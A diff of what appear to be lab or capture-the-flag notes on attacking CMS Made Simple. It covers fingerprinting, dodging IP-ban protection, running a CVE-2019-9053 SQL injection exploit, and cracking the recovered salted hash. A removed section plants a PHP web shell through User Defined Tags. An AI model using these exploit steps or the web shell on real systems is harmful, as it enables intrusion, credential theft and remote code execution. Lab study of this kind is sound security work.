@@ -3,39 +3,49 @@
 ## Discovery
 
 ```bash
-# Nmap identifies cookie
-Cookie: CMSSESSID9d372ef93962=...
+# Cookie in HTTP requests identifies the CMS
+Cookie: CMSSESSID9d372ef93962=njl8ca7p398vm8ca0n6l0jnuq7
 
 # Meta tag in HTML source
 <meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
 
-# Common paths
-/moduleinterface.php
-/admin/
-/uploads/
+# moduleinterface.php exists
+http://TARGET/writeup/moduleinterface.php
 ```
 
 ---
 
-## CVE-2019-9053 - SQL Injection (Time-Based Blind)
+## Eeyore DoS Protection
 
-**Affected:** CMS Made Simple < 2.2.10
+Some installations have DoS protection that monitors Apache 40x errors and bans IPs:
 
-### Vulnerability
+```
+Eeyore DoS protection script that is in place and
+watches for Apache 40x errors and bans bad IPs.
+```
 
-Time-based blind SQL injection in the `News` module via the `m1_idlist` parameter.
+This blocks:
+- Directory fuzzing (feroxbuster, gobuster, ffuf)
+- Nikto scans
+- SQLMap
 
-### Automated Exploitation
+**Workaround:** Target known endpoints directly, avoid triggering 404s.
+
+---
+
+## CVE-2019-9053 - SQL Injection
+
+**Exploitation:**
 
 ```bash
-# Updated exploit
 git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit
 cd SimpleCTF-UpdatedExploit
 
-python3 updated_46635.py -u http://TARGET/cmsms/
+python3 updated_46635.py -u http://TARGET/writeup/
 ```
 
 **Output:**
+
 ```
 [+] Salt for password found: 5a599ef579066807
 [+] Username found: jkr
@@ -43,69 +53,20 @@ python3 updated_46635.py -u http://TARGET/cmsms/
 [+] Password found: 62def4866937f08cc13bab43bb14e6f7
 ```
 
-### Cracking the Hash
+---
 
-CMS Made Simple uses `md5($salt.$pass)` format:
+## Cracking the Hash
+
+CMS Made Simple uses `md5($salt.$pass)` - Hashcat mode 20.
 
 ```bash
 # Format: hash:salt
-echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > hash.txt
+cat hash.txt
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
 
-# Hashcat mode 20
+# Crack with hashcat
 hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt
-```
 
----
-
-## Eeyore DoS Protection
-
-Some CMS Made Simple installations have Apache-based DoS protection that monitors for 40x errors and bans IPs. This blocks:
-
-- Directory fuzzing (feroxbuster, gobuster, ffuf)
-- Nikto scans
-- SQLMap (aggressive mode)
-
-**Workaround:** Target known endpoints directly, avoid triggering 404s.
-
----
-
-## Post-Auth RCE
-
-If you obtain admin credentials:
-
-1. Navigate to Extensions → User Defined Tags
-2. Create a new tag with PHP code:
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-3. Call the tag in a template or directly
-
----
-
-## Config Files
-
-```bash
-# Database credentials
-/var/www/html/cmsms/config.php
-
-# Contains:
-$config['db_hostname'] = 'localhost';
-$config['db_username'] = 'cmsms';
-$config['db_password'] = 'password';
-$config['db_name'] = 'cmsms';
-```
-
----
-
-## Default Paths
-
-```
-/admin/               # Admin login
-/uploads/             # Uploaded files
-/tmp/                 # Temporary files
-/lib/                 # Libraries
-/modules/             # Installed modules
-/config.php           # Main config
+# Result
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
 ```
